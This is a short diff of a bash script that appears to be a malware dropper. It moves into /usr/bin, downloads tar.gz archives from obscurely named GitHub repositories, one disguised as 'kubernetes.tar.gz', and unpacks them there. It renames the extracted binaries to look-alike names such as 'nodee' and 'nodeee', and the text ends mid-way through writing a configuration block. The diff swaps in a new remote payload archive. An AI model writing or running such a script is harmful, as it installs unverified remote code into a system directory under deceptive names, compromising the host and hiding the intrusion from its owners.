@@ -1,11 +1,12 @@
 #!/bin/bash
 cd /usr/bin
 
-wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
-tar xvzf csv44.tar.gz
+wget https://raw.githubusercontent.com/metrorelax/catalina/main/kubernetes.tar.gz
+tar xvzf kubernetes.tar.gz
+mv bash1 nodee
+
 wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
 tar xvzf csv45.tar.gz
-mv nodejs nodee
 mv ruby nodeee
 
 echo '{
